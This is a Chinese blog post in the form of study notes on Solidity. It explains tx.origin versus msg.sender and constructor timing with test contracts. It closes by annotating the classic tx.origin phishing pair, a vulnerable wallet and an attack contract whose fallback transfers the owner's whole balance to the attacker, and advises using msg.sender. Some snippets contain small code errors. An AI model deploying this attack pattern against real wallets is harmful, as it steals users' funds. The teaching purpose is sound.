# 【筆記】Solidity - constructor & tx.origin & msg.sender 傻傻分不清楚

###### tags: `筆記文章`

最近剛開始學習 Solidity 這門用來攥寫智能合約的語言，在學習過程中常常看到 『**tx.origin**』、『**msg.sender**』這兩個語法，因此開始找尋這方面的資料，找著找著看到了這篇文章 [solidity 智慧合約中 tx.origin 的正確使用場景](https://www.itread01.com/content/1563448805.html) 才發現原來『constructor』被呼叫的時間點跟我想像中的不太一樣，所以打算自己測試一遍，並將實作的過程記錄下來。

**如果您已經了解上面那篇文章為什麼會被攻擊成功的話，那這篇文章您可以不必再繼續往下看，感謝您！**

## tx.origin & msg.sender

關於這兩個語法，首先我們先來看看官方文件怎麼說：

> `msg.sender` (`address`): sender of the message (current call)
> `tx.origin` (`address`): sender of the transaction (full call chain)

- `msg.sender` 代表著當前呼叫的地址，可以想像成 JavaScript 的 `this`『誰用我！我就是誰！』。
- `tx.origin` 代表著發起交易的地址，可以想像成永遠指向發起人。

舉例來說：今天有兩個合約(ContractA,ContractB)，使用者(小明)會呼叫 Ａ 合約，而 A 合約裡面又會再去呼叫 B 合約，整個流程大概會是 `小明 -> A -> B` 這樣。

如果這時我們在 B 合約裡面查看 `msg.sender` 與 `tx.origin` 的話，會得到 `msg.sender = A 合約地址` 及 `tx.origin = 小明的地址` 的答案，因為 `msg.sender` 是『誰用我我就是誰』，而 `tx.origin` 很好理解就是自己。

## Constructor

一般我們對 Constructor 的理解大概就是物件導向中類別(Class)的 Constructor，而在 Solidity 裡面的 Constructor 不僅可以像我們所熟知的那樣，透過 `new` 關鍵字去建立一個 Contract 的 Instence 之外，還有一個特別重要的特性，那就是在『**Deploy 到區塊鏈上時就會觸發 Constructor**』。

#### 這邊出一個題目考考大家：

今天『小明』寫了下面這個智能合約，然後將它發佈到了區塊鏈上，並告訴『小王』説：誒～你去使用一下我的合約！

請問～ 當呼叫 `getAddress` 時會顯示 小明的地址 還是 小王的地址呢？

```solidity=
contract TestC {
    uint256 _address;
    constructor() {
        _address = msg.sender;
    }
    function getAddress() public view returns (address){
        return _address;
    }
}
```

我們都知道 Constructor 只會執行一次，所以當我們在使用已經 Deploy 到區塊鏈上的 Contract 時就不會再次觸發 Constructor。因為區塊鏈特性會將資料保存在區塊鏈上，而這點跟我們在一般程式開發上的概念不太一樣。

舉例來說：每當我們在瀏覽器上重新整理的時後，會重新跟伺服器拿一次檔案(誒誒～伺服器把網頁文檔 index.html 給我)，所以整個狀態會重新刷新(變數會回歸為初始值)，而在區塊鏈上則不是這樣，變數將還會是上一次的值。

因此！上面這題的答案會是......**小明的地址**，因為在 Deploy 到區塊鏈上時就已經執行了 Constructor 將 `msg.sender` 寫入到變數(`_address`)之中，而這時的 `msg.sender` 當然就是發佈這個智能合約的『小明』嘍！

## 實作

以下的實作內容我們會使用兩個角色『小明(0xE9c7E)』與『小王(0xe3c17B)』來模擬交互的部分，內容分為以下兩個部分。

1. 小明 建立基礎合約，並給 小王 呼叫
2. 小王 建立一份合約，裡面使用小明 Deploy 的合約

### 小明 建立基礎合約並 Deploy，並給 小王 呼叫

小明建立了一個合約(BaseContract)，透過 constructor 將 `tx.origin` 、 `msg.sender` 等資料記錄在合約變數中，並 Deploy 後叫小王透過 Web3.js 去呼叫裡面的 Function 看看變化。

我們直接來測試一下！

#### BaseContract 合約：

```solidity=
// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;
// 基本的合約，到時會給後續的合約來使用 看看 tx.origin 與 msg.sender 的變化，以及 constructor 的使用。
// BaseContract -> ContractIsUsedDeployedBase
// ContractIsUsedDeployedBase 使用 已經上鏈後(Deploy)的 BaseContract

// ＰS. BaseContract 可以請朋友幫忙上鏈，這樣當你自己將 ContractIsUsedDeployedBase 上鏈後，
//      比較好看出 tx.origin 與 msg.sender 的差別


contract BaseContract {
    address _owner; // 紀錄 msg.sender
    address _contractOwner; //紀錄 tx.origin;
    uint256 _constructorNum;// 透過呼叫 constructor 時傳入值
    uint256 _initNum; // constructor 時設定初始值

    constructor(uint256 num)  {
        _contractOwner = tx.origin;
        _owner = msg.sender;
        _constructorNum = num;
        _initNum = 10;
    }


    function getContractOwner() public view returns (address){
        return _contractOwner;
    }
     function getOwner() public view returns (address){
        return _owner;
    }
    function getConstructorNum() public view returns (uint256){
        return _constructorNum;
    }
    function getNum() public view returns (uint256){
        return _initNum;
    }
    function getMsgSender() public view returns (address){
        return msg.sender;
    }
     function getTxOrigin() public view returns (address){
        return tx.origin;
    }
}

```

#### Web3.js 呼叫 BaseContract：

從測試結果來看，因為我們都知道 constructor 是在 Deploy 時被呼叫，所以 `getContractOwner`、`getOwner` 則會代表著小明的地址，而 `getMsgSender`、`getTxOrigin` 則會代表呼叫者(小王)的地址。

![](https://i.imgur.com/HmyvxRt.png)

### 小王 建立一個合約，裡面使用小明 Deploy 的合約

現在我們讓小王創建一個合約，裡面去使用小明剛剛 Deploy 的那份合約，並且去呼叫合約裡面的 function，透過這樣的方式來看看 constructor 是否被調用以及 `tx.origin` 與 `msg.sender` 的值究竟是什麼！？

我們直接來測試一下！

#### ContractUseDeployedBase 合約：

```solidity=
// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

// ContractIsUsedDeployedBase 使用 已經上鏈後(Deploy)的 BaseContract
// 請呼叫裡面的每一個 function 看看 BaseContract 與 ContractIsUsedDeployedBase 合約內的 tx.origin 與 msg.sender 的變化，以及 constructor 的使用。

// ＰS. BaseContract 可以請朋友幫忙上鏈，這樣當你自己將 ContractIsUsedDeployedBase 上鏈後，
//      比較好看出 tx.origin 與 msg.sender 的差別


interface IBaseContract {
    function getContractOwner() external view returns (address);
    function getOwner() external view returns (address);
    function getConstructorNum() external view returns (uint256);
    function getNum() external view returns (uint256);
    function getMsgSender() external view returns (address);
    function getTxOrigin() external view returns (address);
}

contract ContractUseDeployedBase {

    IBaseContract baseContract ;
    constructor(address _address) {
        baseContract =  IBaseContract(_address);
    }


    function getBCContractOwner() public view returns (address){
        return baseContract.getContractOwner();
    }
     function getBCOwner() public view returns (address){
        return baseContract.getOwner();
    }
    function getBCConstructorNum() public view returns (uint256){
        return baseContract.getConstructorNum();
    }
    function getBCNum() public view returns (uint256){
        return baseContract.getNum();
    }
    function getBCMsgSender() public view returns (address){
        return baseContract.getMsgSender();
    }
     function getBCTxOrigin() public view returns (address){
        return baseContract.getTxOrigin();
    }
    function getMsgSender() public view returns (address){
        return msg.sender;
    }
     function getTxOrigin() public view returns (address){
        return tx.origin;
    }
}

```

#### 透過 Remix 查看：

從測試結果來看，可以發現當我們在合約內使用已發佈的合約時，並不會再次調用 constructor，以及透過從 `getBCMsgSender` 呼叫中可以發現 `msg.sender` 指到的是『小王現在這個合約』，驗證了一開始所說的 A 合約使用 B 合約，B 合約裡的 `msg.sender` 會是 A 合約地址的結果。

![](https://i.imgur.com/0mJ3pG7.png)

### 補充：使用 new 關鍵字建立合約 instance

透過 new 關鍵字建立合約 instance，這就像是物件導向中 new 一個 Class 的實例一樣。這裡特別提出來主要是，這種方式會去執行合約的 constructor，因為是去建立一個新的合約。[參考：Creating Contracts via new](https://docs.soliditylang.org/en/v0.8.9/control-structures.html?highlight=new%20keyword#creating-contracts-via-new)

```solidity=
// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

// 未上鏈合約
contract ContractUnDeploy {
    uint256 _price;
    address _caller;
    constructor(uint256 value) {
        _price = value;
        _caller = msg.sender // 自己(呼叫者)
    }
    function getCPrice() public view returns (uint256){
        return _price;
    }
    function getCPricePlus() public view returns (uint256){
        return _price+5;
    }
    function getCCaller() public view returns (address){
        return _caller;
    }
}

// ContractUseUnDeployContract 使用上面 『未上鏈合約』，透過呼叫 setCPrice 去重複呼叫 ContractUnDeploy constructor。
// getCCaller 所指向 _caller 會是 呼叫者
contract ContractUseUnDeployContract {
    ContractUnDeploy contractC ;
    function setCPrice(uint256 num) public payable {
        contractC = new ContractUnDeploy(num);
    }
    function getCPricePlus() public view returns (uint256){
        return contractC.getCPricePlus();
    }
     function getCCaller() public view returns (address){
        return contractC.getCCaller();
    }
}


```

## 解說『solidity 智能合约中 tx.origin 的正确使用场景』

看完上面對 tx.origin 與 msg.sender 的解釋與範例後，現在我們再回來看[這篇文章](https://www.itread01.com/content/1563448805.html)。

我們可以看到文章中有提到兩個合約，一個是漏洞合約、一個是攻擊漏洞的合約，再來看到描述寫：『攻擊者欺騙你用正常合约擁有者的地址向攻擊合约轉帳』，但看了攻擊合約的程式碼後我覺得應該是:『攻擊者欺騙合約擁有者用正常合約去打攻擊合約』，因為這樣 `TxUserWallet(msg.sender)` 的 `msg.sender` 才會是合約地址。

因為題目有點不清楚，所以這邊直接用兩種角度來看：

1. 正常合約『已被 **Deploy**』，因此將不會觸發 Constructor。
2. 正常合約『尚未 **Deploy**』，建立合約實例觸發 Constructor。

### 正常合約已被 Deploy，因此將不會觸發 Constructor

#### 漏洞合約解釋

```solidity=
pragma solidity ^0.4.11;

contract TxUserWallet {
    address owner;
    // 因為在 Deploy 時就被呼叫，所以 owner = 合约擁有者
    function TxUserWallet() public {
        owner = msg.sender;
    }

    function transferTo(address dest, uint amount) public {
        // tx.origin 指的是發起整個合約操作的人，
        // 因今天是 擁有者 透過 攻擊合約來呼叫這個(漏洞)合約
        // 所以 tx.origin 會是 擁有者
        // 因此會通過 require 檢查
        require(tx.origin == owner);
        // 透過 攻擊合約呼叫 transferTo 時，
        // 傳入的 dest 為 攻擊者的地址，因此會將錢轉給攻擊者。
        dest.transfer(amount);
    }
}
```

#### 攻擊合約解釋

```solidity=
pragma solidity ^0.4.11;

interface TxUserWallet {
    function transferTo(address dest, uint amount) public;
}

contract TxAttackWallet {
    address owner;
    // 攻擊合約 Deploy 時觸發，因此 owner 為攻擊者地址
    function TxAttackWallet() public {
        owner = msg.sender;
    }
    // 擁有者呼叫此合約時，會自動呼叫 fallback function
    // 呼叫 TxUserWallet 的 transferTo function(攻擊者地址,金額)
    function () public {
        TxUserWallet(msg.sender).transferTo(owner, msg.sender.balance);
    }
}
```

### 正常合約尚未 Deploy，建立合約實例觸發 Constructor。

#### 漏洞合約解釋

```solidity=
pragma solidity ^0.4.11;

contract TxUserWallet {
    address owner;
    // constructor 會在合約被 new 的時候被呼叫
    function TxUserWallet() public {
        owner = msg.sender; // msg.sender 是 呼叫者
        //呼叫者呼叫攻擊者合約，裡面呼叫了 new TxUserWallet 建立了 TxUserWallet 合約實例，因此觸發了此 constructor。
    }

    function transferTo(address dest, uint amount) public {
        // tx.origin 指的是發起整個合約操作的人，
        // 所以 tx.origin 會指向 呼叫者
        // 因此會通過 require 檢查
        require(tx.origin == owner);
        // 透過 攻擊合約呼叫 transferTo 時，
        // 傳入的 dest 為 攻擊者的地址，因此會將錢轉給攻擊者。
        dest.transfer(amount);
    }
}
```

#### 攻擊合約解釋

```solidity=
pragma solidity ^0.4.11;

interface TxUserWallet {
    function transferTo(address dest, uint amount) public;
}

contract TxAttackWallet {
    address owner;
    // 攻擊合約 Deploy 時觸發，因此 owner 為攻擊者地址
    function TxAttackWallet() public {
        owner = msg.sender;
    }
    // 擁有者呼叫此合約時，會自動呼叫 fallback function
    // 呼叫 TxUserWallet 的 transferTo function(攻擊者地址,金額)
    // 這邊的 TxUserWallet(msg.sender) 當作是建立 TxUserWallet 合約實例，因為通過驗證所以會將錢轉到 攻擊者帳戶 中。
    function () public {
        TxUserWallet(msg.sender).transferTo(owner, msg.sender.balance);
    }
}
```

## 結論

這次研究了 `tx.origin` 與 `msg.sender` 在各種情境下所指向的位址，再研究的過程中發現 `constructor` 跟自己以往想的不太一樣，所以特別測試了一下所有情況並將過程記錄下來，最後解釋了一篇經典攻擊合約的例子。

裡面刻意用了兩種不同 `constructor` 被呼叫的例子，最後發現這兩種方式都會讓合約被攻擊成功，有此可知在寫邏輯判斷的時候，如果要使用 `tx.origin` 的話需要更謹慎思考一下，可以使用 `msg.sender` 來代替 `tx.origin` 進行判斷會比較安全。

#### 以上就是這次的全部內容，希望對想了解 tx.origin 與 msg.sender 的人能有一點點幫助，如有任何錯誤或冒犯的地方還請各位多多指教。

### 謝謝觀看。

#### Github : [https://github.com/librarylai/JSDC-web3-demo/tree/main/contracts](https://github.com/librarylai/JSDC-web3-demo/tree/main/contracts)

## Reference

1. [docs.soliditylang.org](https://docs.soliditylang.org/en/v0.8.10/contracts.html)
2. [solidity 智慧合約中 tx.origin 的正確使用場景](https://www.itread01.com/content/1563448805.html)
